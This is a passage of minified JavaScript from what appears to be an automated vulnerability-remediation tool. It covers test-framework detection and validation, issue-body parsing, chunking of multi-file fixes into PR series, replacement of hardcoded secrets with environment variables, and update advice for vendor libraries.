runner"'}}detectFrameworkFromContent(X){if(/\bcy\.(get|visit|request|contains|intercept|wait)\b/.test(X)||/\bCypress\.(Commands|env|config)\b/.test(X)||/\/\/\/\s*<reference\s+types="Cypress"\s*\/>/.test(X))return"cypress";if(/from\s+['"]@playwright\/test['"]/.test(X)||/require\s*\(\s*['"]@playwright\/test['"]\s*\)/.test(X))return"playwright";if(/from\s+selenium\s+import/.test(X)||/require\s*\(\s*['"]selenium-webdriver['"]\s*\)/.test(X))return"selenium";if(/from\s+['"]vitest['"]/.test(X)||/import\s*\{[^}]*\}\s*from\s*['"]vitest['"]/.test(X))return"vitest";if(/from\s+['"]@testing-library\//.test(X)||/require\s*\(\s*['"]@testing-library\//.test(X))return"jest";if((/require\s*\(\s*['"]chai['"]\s*\)/.test(X)||/from\s+['"]chai['"]/.test(X))&&!/\bcy\./.test(X))return"mocha";return null}isE2EFramework(X){return new Set(["cypress","playwright","selenium","webdriver","puppeteer","nightwatch"]).has(X.toLowerCase())}getLanguageExtension(X){return{rspec:".rb",minitest:".rb",pytest:".py",phpunit:".php",pest:".php",jest:".js",vitest:".ts",mocha:".js",junit5:".java",testng:".java",exunit:".exs"}[X.toLowerCase()]||".js"}getTestFileName(X){return{rspec:"vulnerability_validation_spec.rb",minitest:"vulnerability_validation_test.rb",pytest:"test_vulnerability_validation.py",phpunit:"VulnerabilityValidationTest.php",pest:"VulnerabilityValidationTest.php",jest:"vulnerability_validation.test.js",vitest:"vulnerability_validation.test.ts",mocha:"vulnerability_validation.test.js",junit:"VulnerabilityValidationTest.java",junit4:"VulnerabilityValidationTest.java",junit5:"VulnerabilityValidationTest.java",testng:"VulnerabilityValidationTest.java",exunit:"vulnerability_validation_test.exs"}[X.toLowerCase()]||"vulnerability_validation.test.js"}checkToolAvailable(X){try{let Q=n0(`which ${X}`,{encoding:"utf8",stdio:"pipe",env:process.env});return V.debug(`Tool '${X}' found at: ${Q.trim()}`),!0}catch{return V.debug(`Tool '${X}' not found. PATH: ${process.env.PATH?.substring(0,200)}`),!1}}getBaseToolFromCommand(X){return X.split(/\s+/)[0]}async validateSyntax(X,Q){if(!Q.syntaxCheckCommand){V.debug("No syntax check command available");return}let J=this.getBaseToolFromCommand(Q.syntaxCheckCommand);if(!this.checkToolAvailable(J))throw Error(`Syntax check tool '${J}' is not installed or not available on PATH. Framework '${Q.name}' requires '${J}' for syntax validation.`);try{let Y=`${Q.syntaxCheckCommand} ${X}`;n0(Y,{cwd:this.repoPath,encoding:"utf8",env:process.env})}catch(Y){let W=Y instanceof Error?Y.message:String(Y);throw Error(`Syntax validation failed: ${W}`)}}validateTestStructure(X,Q){let J=a1.readFileSync(X,"utf8"),Y={mocha:{patterns:[/describe\s*\(\s*['"`]/,/it\s*\(\s*['"`]/],description:"describe('...', function() { it('...', function() { /* assertions */ }); });"},jest:{patterns:[/describe\s*\(\s*['"`]/,/(it|test)\s*\(\s*['"`]/],description:"describe('...', () => { it('...', () => { /* assertions */ }); });"},vitest:{patterns:[/describe\s*\(\s*['"`]/,/(it|test)\s*\(\s*['"`]/],description:"describe('...', () => { it('...', () => { /* assertions */ }); });"},pytest:{patterns:[/def\s+test_\w+\s*\(/],description:`def test_vulnerability():
    assert condition, 'message'`},rspec:{patterns:[/describe\s+['"`\w]/,/it\s+['"`]/],description:`describe 'Subject' do
  it 'tests something' do
    expect(...).to ...
  end
end`},exunit:{patterns:[/describe\s+['"`]/,/test\s+['"`]/],description:`describe "Subject" do
  test "tests something" do
    assert ...
  end
end`},phpunit:{patterns:[/class\s+\w+.*extends.*TestCase/,/function\s+test\w+\s*\(/],description:`class MyTest extends TestCase {
  public function testSomething() { ... }
}`},junit:{patterns:[/@Test/,/void\s+test\w*\s*\(/],description:`@Test
public void testSomething() { ... }`}},W=Q.name.toLowerCase(),G=Y[W];if(!G){V.debug(`No structural validation rules for framework: ${Q.name}`);return}let H=[];for(let $ of G.patterns)if(!$.test(J))H.push($.source);if(H.length>0){let $=`Test file lacks proper ${Q.name} structure.
`;throw $+=`Missing patterns: ${H.join(", ")}
`,$+=`Expected structure:
${G.description}
`,Error($)}if(["mocha","jest","vitest"].includes(W)){if(this.hasModuleLevelAssertions(J,W)){let z=`Test file has ASSERTIONS OUTSIDE it() callbacks.
`;throw z+=`Assertions in describe() scope or at module level run at load time, not during test execution.
`,z+="CRITICAL: Move ALL logic (file reads, variable assignments, AND assertions) INSIDE the it() callback function.",Error(z)}}V.debug(`Test structure validation passed for ${Q.name}`)}hasModuleLevelAssertions(X,Q){if(!["mocha","jest","vitest"].includes(Q))return!1;let J=[/assert\s*\.\s*\w+\s*\(/g,/assert\s*\([^)]+\)/g,/expect\s*\([^)]+\)/g,/\.should\.\w+/g],Y=[];for(let G of J){let H,$=new RegExp(G.source,"g");while((H=$.exec(X))!==null)Y.push({match:H[0],index:H.index})}if(Y.length===0)return!1;let W=Array.from(X.matchAll(/it\s*\(\s*['"`][^'"`]+['"`]\s*,\s*(?:async\s+)?(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g)).map((G)=>G.index);if(W.length===0)return!0;for(let G of Y){let H=!1;for(let $ of W)if(G.index>$){let z=X.slice($),U=0,K=$,B=!1;for(let q=0;q<z.length;q++)if(z[q]==="{")U++,B=!0;else if(z[q]==="}"){if(U--,B&&U===0){K=$+q;break}}if(G.index>=$&&G.index<K){H=!0;break}}if(!H)return V.debug(`Module-level assertion found: "${G.match}" at index ${G.index}`),!0}return!1}buildTestNameFilter(X,Q){if(!Q)return"";let Y={jest:"--testNamePattern",vitest:"-t",mocha:"--grep",rspec:"-e",pytest:"-k",minitest:"-n",phpunit:"--filter",exunit:"--only"}[X.name];if(!Y)return"";let W=Q.replace(/"/g,"\\\"");return` ${Y} "${W}"`}async runTest(X,Q,J){if(!Q.testCommand)return V.warn("No test command available, skipping test execution"),{passed:!1,existingTestsFailed:!1,output:"",stderr:"",exitCode:1};let Y=this.getBaseToolFromCommand(Q.testCommand);if(!this.checkToolAvailable(Y))return V.warn(`Test runner tool '${Y}' is not installed or not available on PATH. Framework '${Q.name}' requires '${Y}' for test execution. Skipping test run.`),{passed:!1,existingTestsFailed:!1,output:"",stderr:"",exitCode:1};try{let W;if(Q.testCommand.startsWith("mvn ")){let z=W0.basename(X).replace(/\.java$/,"");if(Q.testCommand.includes("-Dtest="))W=`${Q.testCommand}${z}`;else W=`${Q.testCommand} -Dtest=${z}`}else if(Q.testCommand.includes("gradlew")&&Q.testCommand.includes("--tests")){let z=W0.basename(X).replace(/\.java$/,"");W=`${`GRADLE_USER_HOME="${this.repoPath}/.gradle"`} ${Q.testCommand}${z} --no-daemon`}else W=`${Q.testCommand} ${X}`;V.info(`Running test command: ${W}`);let G=n0(W,{cwd:this.repoPath,encoding:"utf8",env:process.env});if(/0 examples|0 tests|no tests|All examples were filtered out/i.test(G))return V.warn("Test ran 0 tests (filter mismatch or empty file) - treating as failure"),{passed:!1,existingTestsFailed:!1,output:G,stderr:"",exitCode:0};return{passed:!0,existingTestsFailed:!1,output:G,stderr:"",exitCode:0}}catch(W){let G=W.stdout||W.message||"",H=W.stderr||"",$=W.status||1;return{passed:!1,existingTestsFailed:!1,failedTests:void 0,output:G,stderr:H,exitCode:$}}}extractFailedTestNames(X){let Q=[],J=[/FAIL\s+(.+)/g,/\s+(.+)/g,/Failed:\s+(.+)/g,/\d+\)\s+(.+)/g];for(let Y of J){let W=X.matchAll(Y);for(let G of W)if(G[1])Q.push(G[1].trim())}return Q.slice(0,5)}async tagIssueNotValidated(X,Q){V.error(`Failed to validate vulnerability after ${Q.length} attempts`),V.error(`Vulnerability: ${X.type} at ${X.location}`),V.error("Attempt history:");for(let J of Q)V.error(`  - Attempt ${J.attempt}: ${J.error} - ${J.errorMessage}`)}async scanTestFiles(X){let Q=[],J=WP,Y=YP,W=(G)=>{try{let H=a1.readdirSync(G,{withFileTypes:!0});for(let $ of H){let z=W0.join(G,$.name);if($.isDirectory()){if(!J.has($.name))W(z)}else if($.isFile()){let U=$.name;if(Y.some((K)=>K.test(U)))Q.push(W0.relative(this.repoPath,z))}}}catch(H){}};return W(this.repoPath),[...new Set(Q)]}formatTestSuite(X){if(X.redTests&&Array.isArray(X.redTests))return X;if(X.red)return{redTests:[X.red]};if(X.testName&&X.testCode)return{redTests:[X]};return X}detectLanguage(X){let Q=W0.extname(X).toLowerCase();return{".rb":"ruby",".js":"javascript",".ts":"typescript",".py":"python",".java":"java",".php":"php",".ex":"elixir",".exs":"elixir"}[Q]||"javascript"}async detectFrameworkWithBackend(X){if(!this.testIntegrationClient)return V.debug("No TestIntegrationClient  falling back to extension-based detection"),this.detectFrameworkFromFile(X);try{let Q=W0.join(this.repoPath,"package.json"),J=W0.join(this.repoPath,"Gemfile"),Y=W0.join(this.repoPath,"requirements.txt"),W=W0.join(this.repoPath,"pyproject.toml"),G=W0.join(this.repoPath,"composer.json"),H=W0.join(this.repoPath,"mix.exs"),$=W0.join(this.repoPath,"pom.xml"),z=W0.join(this.repoPath,"build.gradle"),U=null,K=null,B=null,q=null,Z=null,M=null,L=null,R=null;if(a1.existsSync(Q))try{U=JSON.parse(a1.readFileSync(Q,"utf8"))}catch(o){V.warn(`Could not parse package.json: ${o}`)}if(a1.existsSync(J))K=a1.readFileSync(J,"utf8");if(a1.existsSync(Y))B=a1.readFileSync(Y,"utf8");if(a1.existsSync(W))q=a1.readFileSync(W,"utf8");if(a1.existsSync(G))try{Z=JSON.parse(a1.readFileSync(G,"utf8"))}catch(o){V.warn(`Could not parse composer.json: ${o}`)}if(a1.existsSync(H))M=a1.readFileSync(H,"utf8");if(a1.existsSync($))L=a1.readFileSync($,"utf8");if(a1.existsSync(z))R=a1.readFileSync(z,"utf8");let j={};if(U)j["package.json"]=JSON.stringify(U);if(K)j.Gemfile=K;if(B)j["requirements.txt"]=B;if(q)j["pyproject.toml"]=q;if(Z)j["composer.json"]=JSON.stringify(Z);if(M)j["mix.exs"]=M;if(L)j["pom.xml"]=L;if(R)j["build.gradle"]=R;let F=this.detectLanguage(X);if(this.availableTestLibraries=ZP(F,j),this.availableTestLibraries.length>0)V.info(`[RFC-103] Test library detection (${F}): found ${this.availableTestLibraries.length} libraries: ${this.availableTestLibraries.join(", ")}`);else V.debug(`[RFC-103] Test library detection (${F}): no test libraries found`);let A=this.projectEcosystems.length>0&&!this.projectEcosystems.includes(F),O={javascript:"vitest",python:"pytest",php:"phpunit",ruby:"rspec"},w=O[F]!==void 0,N=MP(F,this.availableTestLibraries);if(A&&w)V.info(`[RFC-103] Cross-ecosystem detected: ${F} file in ${this.projectEcosystems.join("/")} project. Using bundled ${O[F]}.`),this.noTestFrameworkAvailable=!1;else if(N&&w)V.info(`[RFC-103] No test framework in project, using bundled ${O[F]} from Docker image.`),this.noTestFrameworkAvailable=!1;else if(N)V.warn(`[RFC-103] No test framework detected for ${F} project (only stdlib: ${this.availableTestLibraries.join(", ")})`),this.noTestFrameworkAvailable=!0;else this.noTestFrameworkAvailable=!1;let _=["vitest.config.ts","vitest.config.js","vitest.config.mts","jest.config.ts","jest.config.js","jest.config.mjs",".mocharc.yml",".mocharc.json",".mocharc.js","pytest.ini","setup.cfg","pyproject.toml",".rspec","spec_helper.rb","phpunit.xml","phpunit.xml.dist","mix.exs"].filter((o)=>a1.existsSync(W0.join(this.repoPath,o)));if(!U&&!K&&!B&&!q&&!Z&&!M&&!L&&!R&&_.length===0)return V.debug("No manifest files found  falling back to extension-based detection"),this.detectFrameworkFromFile(X);let h=await this.testIntegrationClient.detectFramework({packageJson:U,gemfile:K,requirementsTxt:B,composerJson:Z,mixExs:M,pomXml:L,buildGradle:R,configFiles:_});return V.info(`Backend framework detection: ${h.framework} (testDir: ${h.testDir})`),h.framework}catch(Q){return V.warn(`Backend framework detection failed, falling back to extension-based: ${Q}`),this.detectFrameworkFromFileWithEcosystemFallback(X)}}extractTestLibraries(X){if(!X)return[];let Q=["chai","should","expect","expect.js","power-assert","assert","mocha","jest","vitest","ava","tape","jasmine","sinon","testdouble","nock","msw","supertest","superagent","@testing-library/react","@testing-library/jest-dom","enzyme","faker","@faker-js/faker","chance"],J={...X.dependencies,...X.devDependencies},Y=[];for(let W of Q)if(J[W])Y.push(W);if(Y.length>0&&!Y.includes("assert"))Y.push("assert (Node built-in)");return Y}detectFrameworkFromFileWithEcosystemFallback(X){let Q=W0.extname(X).toLowerCase(),J={".js":"javascript",".ts":"javascript",".jsx":"javascript",".tsx":"javascript",".mjs":"javascript",".py":"python",".rb":"ruby",".php":"php",".java":"java",".ex":"elixir",".exs":"elixir",".go":"go"},Y={javascript:"vitest",python:"pytest",php:"phpunit",ruby:"rspec",elixir:"exunit",java:"junit5"},W=J[Q];if(this.projectEcosystems.length>0&&W){if(!this.projectEcosystems.includes(W)){let G=Y[W];if(G)return V.info(`[RFC-103] Cross-ecosystem: ${W0.basename(X)} (${W}) in ${this.projectEcosystems.join("/")} project. Using bundled ${G}.`),G}}return this.detectFrameworkFromFile(X)}getFrameworkForEcosystem(X){let Q=this.availableTestLibraries.map((J)=>J.toLowerCase());switch(X){case"ruby":if(Q.includes("rspec")||Q.includes("rspec-rails"))return"rspec";let J=["database_cleaner","factory_bot","shoulda-matchers","simplecov","capybara"];if(J.some((W)=>Q.includes(W))&&!Q.includes("rspec")&&!Q.includes("rspec-rails"))return V.info(`[RFC-103] Ruby project has minitest helpers (${J.filter((W)=>Q.includes(W)).join(", ")}) but no rspec  using minitest`),"minitest";return"rspec";case"javascript":if(Q.includes("vitest"))return"vitest";if(Q.includes("jest"))return"jest";if(Q.includes("mocha"))return"mocha";return"vitest";case"python":return"pytest";case"php":return"phpunit";case"java":return"junit5";case"elixir":return"exunit";case"go":return"testing";default:return null}}detectFrameworkFromFile(X){let Q=W0.extname(X).toLowerCase();if(Q===".rb")return this.getFrameworkForEcosystem("ruby")||"rspec";return{".js":"vitest",".ts":"vitest",".py":"pytest",".java":"junit5",".php":"phpunit",".ex":"exunit",".exs":"exunit"}[Q]||"vitest"}}var ZG=$1(()=>{y1();UV();N5();w5();g9();JP();JV();GP();hU();BV();VP();BP();jP();FP()});var AP={};Y9(AP,{parseIssueBody:()=>be1,enhanceValidationData:()=>ve1});function be1(X){let Q={files:[]};if(!X||typeof X!=="string")return V.warn("[IssueBodyParser] Invalid issue body provided"),Q;let J=X.match(/\*\*Type\*\*:\s*(.+)/);if(J)Q.type=J[1].trim();let Y=X.match(/\*\*Severity\*\*:\s*(\S+)/);if(Y)Q.severity=Y[1];let W=/####\s*`([^`]+)`/g,G=X.split(`
`),H=null,$=!1;for(let z=0;z<G.length;z++){let U=G[z],K=U.match(/####\s*`([^`]+)`/);if(K){if(H)Q.files.push(H);H={path:K[1],vulnerabilities:[]},$=!0;continue}if($&&H&&U.trim().startsWith("-")){let B=U.match(/-\s*\*\*Line\s+(\d+)\*\*:\s*(.+)/);if(B)H.vulnerabilities.push({line:parseInt(B[1],10),message:B[2].trim()})}if(U.startsWith("###")&&!U.includes("Affected Files")){if($=!1,H)Q.files.push(H),H=null}}if(H)Q.files.push(H);return V.debug("[IssueBodyParser] Parsed issue body:",{type:Q.type,severity:Q.severity,filesCount:Q.files.length,files:Q.files.map((z)=>({path:z.path,vulnerabilitiesCount:z.vulnerabilities.length}))}),Q}function ve1(X,Q){let J={...X,vulnerabilities:[...X.vulnerabilities||[]]},Y=new Map;return Q.files.forEach((W)=>{W.vulnerabilities.forEach((G)=>{if(!Y.has(G.line))Y.set(G.line,W.path);else V.debug("[IssueBodyParser] Line number collision detected:",{line:G.line,existingFile:Y.get(G.line),newFile:W.path})})}),J.vulnerabilities=J.vulnerabilities.map((W)=>{if(W.file==="unknown.js"&&W.line&&Y.has(W.line)){let G=Y.get(W.line);return V.debug(`[IssueBodyParser] Replacing unknown.js with ${G} for line ${W.line}`),{...W,file:G,type:W.type==="UNKNOWN"&&Q.type?Q.type:W.type}}return W}),V.info("[IssueBodyParser] Enhanced validation data:",{originalCount:X.vulnerabilities?.length||0,enhancedCount:J.vulnerabilities.length,filesFixed:J.vulnerabilities.filter((W)=>W.file!=="unknown.js"&&X.vulnerabilities?.some((G)=>G.file==="unknown.js"&&G.line===W.line)).length}),J}var RP=$1(()=>{y1()});var s5,qV=10,ZV=100,xe1=7500;var ZJ=$1(()=>{MV();((W)=>{W.SIMPLE="simple";W.MODERATE="moderate";W.COMPLEX="complex";W.MANUAL="manual"})(s5||={})});class LP{name="module_grouping";async group(X){let Q=new Map;for(let J of X){let Y=J.path.split("/"),W=Y.length>1?Y[0]:"root";if(!Q.has(W))Q.set(W,[]);Q.get(W).push(J)}return Array.from(Q.values())}}class DP{name="severity_based";async group(X){let Q=new Map;OU.forEach((J)=>Q.set(J,[]));for(let J of X){let Y=Q.get(J.severity);if(Y)Y.push(J)}return OU.map((J)=>Q.get(J)).filter((J)=>J.length>0)}}class NP{name="dependency_analysis";async group(X){let Q=[],J=new Set;for(let W of X){if(J.has(W.path))continue;let G=[W];if(J.add(W.path),W.imports)for(let H of W.imports){let $=X.find((z)=>z.path===H||z.path===H+".js"||z.path===H.replace("./","")+".js"||z.path===H.replace("./",""));if($&&!J.has($.path))G.push($),J.add($.path)}for(let H of X){if(J.has(H.path))continue;if(H.imports?.some(($)=>W.path.includes($.replace("./",""))||W.path===$+".js"))G.push(H),J.add(H.path)}Q.push(G)}let Y=X.filter((W)=>!J.has(W.path));if(Y.length>0)Q.push(Y);return Q}}class t5{config;strategies;constructor(X){this.config=X;this.strategies=new Map,this.strategies.set("module_grouping",new LP),this.strategies.set("severity_based",new DP),this.strategies.set("dependency_analysis",new NP)}async chunkVulnerability(X){let{files:Q}=X,J=[],Y=await this.groupFilesByStrategy(Q),W=0;for(let G of Y){let H=[],$=0;for(let z of G){let U=this.estimateTokens([z]),K=H.length>=this.config.maxFilesPerChunk,B=$+U>this.config.maxContextTokens;if(H.length>0&&(K||B))J.push({index:W++,files:H,estimatedTokens:$,vulnerabilityType:X.type}),H=[],$=0;H.push(z),$+=U}if(H.length>0)J.push({index:W++,files:H,estimatedTokens:$,vulnerabilityType:X.type})}return J}getStrategy(X){let Q=this.strategies.get(X);if(!Q)throw Error(`Strategy ${X} not found`);return Q}async groupFilesByStrategy(X){if(!this.config.strategies||this.config.strategies.length===0)return[X];let Q=this.config.strategies;for(let J of Q){let Y=this.strategies.get(J);if(Y){let W=await Y.group(X);if(W.length>0)return W}}return[X]}estimateTokens(X){return X.reduce((Q,J)=>{let Y=J.lines.length*qV;return Q+Y+ZV},0)}}var MV=$1(()=>{ZJ();RU()});class MJ{prNumbers=new Map;nextPrNumber=1000;async generatePRSeries(X,Q){let J=[],Y=X.length;for(let W=0;W<X.length;W++){let G=X[W],H=W+1,$={number:this.nextPrNumber++,title:`[RSOLV] Fix ${G.vulnerabilityType} (${H}/${Y})`,branch:`rsolv/fix-${Q}-chunk-${H}`,files:G.files,body:this.generatePRBody(G,H,Y,Q,J),dependencies:W>0?[J[W-1].number]:void 0};J.push($),this.prNumbers.set(`${Q}-${H}`,$.number)}return J}generatePRBody(X,Q,J,Y,W){let G=[];if(G.push(`## \uD83D\uDD27 Automated Fix - Part ${Q} of ${J}`),G.push(""),G.push(`Fixes part of #${Y}`),G.push(""),W.length>0){G.push("### Dependencies");let H=W[W.length-1];G.push(`Depends on #${H.number}`),G.push("")}G.push("### Files Modified");for(let H of X.files)G.push(`- \`${H.path}\` (${H.severity} severity)`);if(G.push(""),G.push("### Vulnerability Type"),G.push(`**${X.vulnerabilityType}**`),G.push(""),X.estimatedTokens)G.push("### Context Size"),G.push(`Estimated tokens: ${X.estimatedTokens}`),G.push("");if(J>1)G.push("### PR Series"),G.push(`This is part ${Q} of a ${J}-part fix series.`),G.push("Please review and merge PRs in order."),G.push("");return G.push("---"),G.push("*Generated by RSOLV with multi-file chunking strategy*"),G.join(`
`)}async delay(X){return new Promise((Q)=>setTimeout(Q,X))}}class e5{analyze(X){let Q=this.calculateFactors(X);return this.determineComplexity(Q)}calculateFactors(X){return{fileCount:X.files?.length||1,requiresConfigChange:X.requiresConfigChange||!1,requiresNewDependencies:X.requiresNewDependencies||!1,crossFileReferences:this.countCrossReferences(X),testImpact:this.assessTestImpact(X)}}determineComplexity(X){if(X.fileCount>=10||X.requiresConfigChange&&X.requiresNewDependencies)return"complex";if(X.requiresConfigChange&&X.crossFileReferences>5)return"manual";if(X.fileCount>=3&&X.fileCount<10)return"moderate";return"simple"}countCrossReferences(X){if(!X.files)return 0;let Q=0;for(let J of X.files)if(J.imports)Q+=J.imports.length;return Q}assessTestImpact(X){if(!X.files)return 0;return X.files.filter((J)=>J.path.includes("test")||J.path.includes("spec")).length}}class jV{analyzer=new e5;async route(X){let Q=this.analyzer.analyze(X);if(Q==="complex"||Q==="manual")return{approach:"manual_guide",guide:await this.generateManualGuide(X,Q)};return{approach:"automated",complexity:Q}}async generateManualGuide(X,Q){let J=[];if(X.requiresConfigChange)J.push("1. Update configuration files"),J.push("2. Set environment variables");if(X.requiresNewDependencies)J.push("3. Install required dependencies"),J.push("4. Update package.json");return J.push("5. Review and test changes"),J.push("6. Validate security improvements"),{steps:J.length,content:J.join(`
`),complexity:Q,reason:`This ${X.type} vulnerability requires manual intervention due to its complexity`}}}var wP=$1(()=>{ZJ();ZJ()});class FV{async handle(X){let Q=this.identifySecretType(X),J=this.determineReplacement(Q,X),Y=this.generateCodeFix(X,J),W=this.generateSetupGuide(X,J);return{success:!0,codeFix:Y,setupGuide:W,instructions:W,pr:{title:`[RSOLV] Remove hardcoded ${Q}`,body:`Replaces hardcoded ${Q} with environment variable`,branch:`rsolv/fix-hardcoded-${Q}`,files:[{path:X.file,lines:[X.line],severity:"critical"}]},validationSteps:[`Ensure ${J.envVar} is set in your environment`,"Test the application with the new configuration","Verify the secret is no longer visible in the code"]}}identifySecretType(X){if(X.secretType)return X.secretType.replace("_"," ");let Q=X.secret.toLowerCase();if(Q.includes("api")||Q.includes("key"))return"api key";if(Q.includes("password")||Q.includes("pwd"))return"password";if(Q.includes("token"))return"token";if(Q.includes("cert"))return"certificate";return"secret"}determineReplacement(X,Q){let J=this.generateEnvVarName(X,Q);return{envVar:J,accessor:`process.env.${J}`,configSection:Q.context||"configuration"}}generateEnvVarName(X,Q){if(Q.context==="database_connection")return"DATABASE_PASSWORD";if(X==="api key")return"API_KEY";return X.toUpperCase().replace(/\s+/g,"_")}generateCodeFix(X,Q){let J=[],Y=X.secret.match(/(\w+)\s*[=:]\s*["']([^"']+)["']/);if(Y){let[,W,G]=Y;if(X.secret.includes("="))J.push(`${W} = ${Q.accessor}`);else if(X.secret.includes(":"))J.push(`${W}: ${Q.accessor}`)}else J.push(Q.accessor);return J.join(`
`)}generateSetupGuide(X,Q){let J=[];J.push("## Setup Instructions"),J.push(""),J.push("Set the following environment variable:"),J.push(""),J.push("```bash");let Y=X.secret.match(/["']([^"']+)["']/),W=Y?Y[1]:"<your-secret-value>";if(J.push(`export ${Q.envVar}="${W}"`),J.push("```"),J.push(""),J.push("Or add to your `.env` file:"),J.push("```"),J.push(`${Q.envVar}=${W}`),J.push("```"),J.push(""),X.context==="database_connection")J.push("### Database Configuration"),J.push("Make sure your database connection uses the environment variable."),J.push("");return J.push("### Security Note"),J.push("Never commit secrets to version control. Use environment variables or a secure secret management system."),J.join(`
`)}}var CP={};Y9(CP,{VulnerabilityChunker:()=>t5,TOKENS_PER_LINE:()=>qV,TOKENS_PER_FILE_OVERHEAD:()=>ZV,MultiPRGenerator:()=>MJ,MAX_SAFE_TOKENS:()=>xe1,HardcodedSecretsHandler:()=>FV,FixComplexity:()=>s5,ComplexityRouter:()=>jV,ComplexityAnalyzer:()=>e5,ChunkingIntegration:()=>IP});class IP{chunker;prGenerator;complexityAnalyzer;constructor(X){let Q={enabled:!0,maxFilesPerChunk:3,maxLinesPerChunk:500,maxContextTokens:8000,multiPR:{enabled:!0,delayBetweenPRs:2000}};this.chunker=new t5(X||Q),this.prGenerator=new MJ,this.complexityAnalyzer=new e5}shouldChunk(X){return(X.files?.length||X.filesToModify?.length||1)>3||X.requiresChunking===!0||this.isComplexVulnerability(X)}isComplexVulnerability(X){let Q=this.complexityAnalyzer.analyze(X);return Q==="complex"||Q==="manual"}async processWithChunking(X,Q){console.log(`[ChunkingIntegration] Processing ${X.type} with chunking`);let J=this.convertToMultiFile(X,Q),Y=this.complexityAnalyzer.analyze(J);if(console.log(`[ChunkingIntegration] Complexity: ${Y}`),Y==="manual")return{success:!1,requiresManual:!0,guide:await this.generateManualGuide(J),message:"This vulnerability requires manual intervention"};let W=await this.chunker.chunkVulnerability(J);console.log(`[ChunkingIntegration] Created ${W.length} chunks`);let G=await this.prGenerator.generatePRSeries(W,Q);return console.log(`[ChunkingIntegration] Generated ${G.length} PRs`),{success:!0,chunked:!0,chunks:W.length,prs:G,complexity:Y}}convertToMultiFile(X,Q){let J=X.files||X.filesToModify?.map((Y)=>({path:Y,lines:[],severity:X.severity||"MEDIUM"}))||[];return{type:X.type||"UNKNOWN",issueNumber:Q,files:J,requiresConfigChange:X.requiresConfigChange,requiresNewDependencies:X.requiresNewDependencies}}async generateManualGuide(X){let Q=[];Q.push("## Manual Intervention Required"),Q.push(""),Q.push(`This ${X.type} vulnerability is too complex for automated fixing.`),Q.push(""),Q.push("### Affected Files");for(let J of X.files)Q.push(`- ${J.path}`);return Q.push(""),Q.push("### Recommended Steps"),Q.push("1. Review all affected files for the vulnerability pattern"),Q.push("2. Identify the root cause of the vulnerability"),Q.push("3. Plan a comprehensive fix that addresses all instances"),Q.push("4. Test thoroughly to ensure no functionality is broken"),Q.push("5. Verify the vulnerability is fully resolved"),Q.join(`
`)}}var OV=$1(()=>{MV();wP();OV();ZJ()});import*as jJ from"path";import*as V8 from"fs/promises";class X4{async parsePackageJson(X){let Q=new Map;if(X.dependencies)Object.entries(X.dependencies).forEach(([J,Y])=>{Q.set(J,Y)});if(X.devDependencies)Object.entries(X.devDependencies).forEach(([J,Y])=>{Q.set(J,Y)});if(X.peerDependencies)Object.entries(X.peerDependencies).forEach(([J,Y])=>{Q.set(J,Y)});return Q}isKnownDependency(X,Q){let J=X.replace(/\\/g,"/");for(let[Y,W]of Q){if(J.includes(`node_modules/${Y}/`))return!0;if(J.includes(`vendor/${Y}/`)||J.includes(`vendor/${Y}.`)||J.includes(`/${Y}-`)||J.includes(`/${Y}.`))return!0}return!1}async findManifests(X="."){let Q=[];try{let J=jJ.join(X,"package.json");try{await V8.access(J),Q.push({type:"npm",path:J})}catch{}let Y=jJ.join(X,"requirements.txt");try{await V8.access(Y),Q.push({type:"python",path:Y})}catch{}let W=jJ.join(X,"Gemfile");try{await V8.access(W),Q.push({type:"ruby",path:W})}catch{}let G=jJ.join(X,"composer.json");try{await V8.access(G),Q.push({type:"php",path:G})}catch{}}catch(J){console.error("Error finding manifests:",J)}return Q}async analyzeDependencies(X="."){let Q=new Map,J=await this.findManifests(X);for(let Y of J)try{switch(Y.type){case"npm":{let W=await V8.readFile(Y.path,"utf-8"),G=JSON.parse(W),H=await this.parsePackageJson(G);Q.set("npm",H);break}case"python":{let W=await V8.readFile(Y.path,"utf-8"),G=this.parseRequirementsTxt(W);Q.set("pip",G);break}case"ruby":{let W=await V8.readFile(Y.path,"utf-8"),G=this.parseGemfile(W);Q.set("gem",G);break}case"php":{let W=await V8.readFile(Y.path,"utf-8"),G=JSON.parse(W),H=this.parseComposerJson(G);Q.set("composer",H);break}}}catch(W){console.error(`Error parsing ${Y.type} manifest:`,W)}return Q}parseRequirementsTxt(X){let Q=new Map,J=X.split(`
`);for(let Y of J){let W=Y.trim();if(W&&!W.startsWith("#")){let G=W.match(/^([a-zA-Z0-9-_]+)([><=~!]+)(.+)$/);if(G)Q.set(G[1],G[2]+G[3]);else Q.set(W,"*")}}return Q}parseGemfile(X){let Q=new Map,J=X.split(`
`);for(let Y of J){let G=Y.trim().match(/gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?/);if(G)Q.set(G[1],G[2]||"*")}return Q}parseComposerJson(X){let Q=new Map;if(X.require)Object.entries(X.require).forEach(([J,Y])=>{if(!J.startsWith("php"))Q.set(J,Y)});if(X["require-dev"])Object.entries(X["require-dev"]).forEach(([J,Y])=>{Q.set(J,Y)});return Q}}var MG=()=>{};class Q4{detector;analyzer;constructor(X,Q){this.detector=X;this.analyzer=Q}async handle(X){if(await this.detector.isVendorFile(X.file)){let J=await this.detector.identifyLibrary(X.file);if(J)return{type:"vendor",action:"update",library:J,report:{library:J.name,currentVersion:J.version,recommendedVersion:await this.getRecommendedVersion(J,X),cve:X.cve,updateCommand:this.getUpdateCommand(J),alternativeFix:this.getSafeWorkaround(X)}};else return{type:"vendor",action:"acknowledge",report:{library:"unknown",currentVersion:"unknown",recommendedVersion:"latest",updateCommand:"Manual update required",alternativeFix:"Review vendor library and update manually"}}}return{type:"application",action:"fix"}}async getRecommendedVersion(X,Q){if(X.name==="jquery"){if(X.version.startsWith("3.5."))return"3.5.1";if(X.version.startsWith("3."))return"3.6.0";return"3.6.4"}if(X.name==="bootstrap"){if(X.version.startsWith("4."))return"4.6.2";return"5.3.0"}return"latest"}getUpdateCommand(X){let Q=X.packageManager||"npm",J=X.name;switch(Q){case"npm":return`npm update ${J}`;case"pip":return`pip install --upgrade ${J}`;case"gem":return`bundle update ${J}`;case"composer":return`composer update ${J}`;default:return`${Q} update ${J}`}}getSafeWorkaround(X){switch(X.type){case"XXE":return"Disable external entity processing in XML parser configuration";case"XSS":return"Implement Content Security Policy (CSP) headers";case"SQL_INJECTION":return"Use parameterized queries or prepared statements";default:return}}async isVendorCode(X){return this.detector.isVendorFile(X)}async identifyLibrary(X){return 